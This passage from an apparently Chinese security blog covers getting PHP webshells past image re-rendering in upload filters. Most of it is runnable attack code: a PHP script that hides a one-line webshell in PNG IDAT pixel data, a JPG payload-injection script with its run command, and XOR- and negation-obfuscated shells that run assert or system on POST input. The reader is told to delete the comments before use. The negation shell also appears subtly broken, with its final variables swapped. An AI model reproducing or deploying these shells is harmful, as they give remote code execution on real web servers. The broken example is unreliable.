<h4 id="GIF二次渲染"><a href="#GIF二次渲染" class="headerlink" title="GIF二次渲染"></a>GIF二次渲染</h4><p><code>GIF</code> 绕过二次渲染的方法，就是通过对比上传前和上传后的两个文件，如果说哪个位置，它的上传前和上传后的没有变，我们就把php一句话代码插入到这个位置（用010Editor查看）</p>
<p><img src="/img/lazy.gif" data-original="tp3.png" alt=""></p>
<p>（图片来源：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45588247/article/details/119177948">【文件上传绕过】——二次渲染漏洞_二次渲染绕过-CSDN博客</a>）</p>
<h4 id="PNG二次渲染"><a href="#PNG二次渲染" class="headerlink" title="PNG二次渲染"></a>PNG二次渲染</h4><p>PNG定义了两种类型的数据块，一种是称为关键数据块，这是标准的数据块，另一种叫做辅助数据块，这是可选的数据块，关键数据块定义了3个标准数据块( <strong>IHDR</strong> , <strong>IDAT</strong> , <strong>IEND</strong> )，每个PNG文件都必须包含它们</p>
<p><strong>IDAT：</strong></p>
<blockquote>
<p><code>图像数据块IDAT(image data chunk)</code>：它存储<code>实际的数据</code>，在数据流中可包含<code>多个连续顺序的图像数据块</code><br><code>IDAT</code>存放着图像真正的数据信息</p>
</blockquote>
<p>所以我们下面用php脚本向IDAT数据块中写入一句话木马：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">             <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">             <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">             <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">             <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">             <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">             <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">             <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">  <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">  <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">  <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">  <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">  <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行后生成1.png，然后NotePad++打开后能看到一句话木马</p>
<h4 id="JPG二次渲染"><a href="#JPG二次渲染" class="headerlink" title="JPG二次渲染"></a>JPG二次渲染</h4><p>脚本：（若生成失败，就多选取几张进行尝试）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>输入下面命令生成JPG图片马</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php jpg_payload.php a.jpg</span><br></pre></td></tr></table></figure>
<h3 id="不包含字母和数字"><a href="#不包含字母和数字" class="headerlink" title="不包含字母和数字"></a>不包含字母和数字</h3><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell | 离别歌</a></p>
<p>（使用时记得把注释删除）</p>
<h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%12&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%14&#x27;</span>^<span class="string">&#x27;`&#x27;</span>); </span><br><span class="line"><span class="comment">// $_=&#x27;assert&#x27;;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%2F&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;]&#x27;</span>); <span class="comment">// $__=&#x27;_POST&#x27;;</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]); <span class="comment">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure>
<p>URL编码的为不可见字符</p>
<h4 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[]; <span class="comment">//</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>; <span class="comment">//arrayarray</span></span><br><span class="line"><span class="variable">$_</span>=(<span class="variable">$_</span>==<span class="variable">$__</span>);<span class="comment">//$_=(array==arrayarray)明显不相同 false 0</span></span><br><span class="line"><span class="variable">$__</span>=(<span class="variable">$_</span>==<span class="variable">$_</span>);<span class="comment">//$__=(array==array) 相同返回1</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$___</span> = ~区[<span class="variable">$__</span>].~冈[<span class="variable">$__</span>].~区[<span class="variable">$__</span>].~勺[<span class="variable">$__</span>].~皮[<span class="variable">$__</span>].~针[<span class="variable">$__</span>];<span class="comment">//system</span></span><br><span class="line"><span class="variable">$____</span> = ~码[<span class="variable">$__</span>].~寸[<span class="variable">$__</span>].~小[<span class="variable">$__</span>].~欠[<span class="variable">$__</span>].~立[<span class="variable">$__</span>];<span class="comment">//_POST</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>(<span class="variable">$$__</span>[_]);<span class="comment">//也就是system($_POST[_])</span></span><br></pre></td></tr></table></figure>
<p>且<code>true+true==2</code>即<code>(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)==2</code></p>
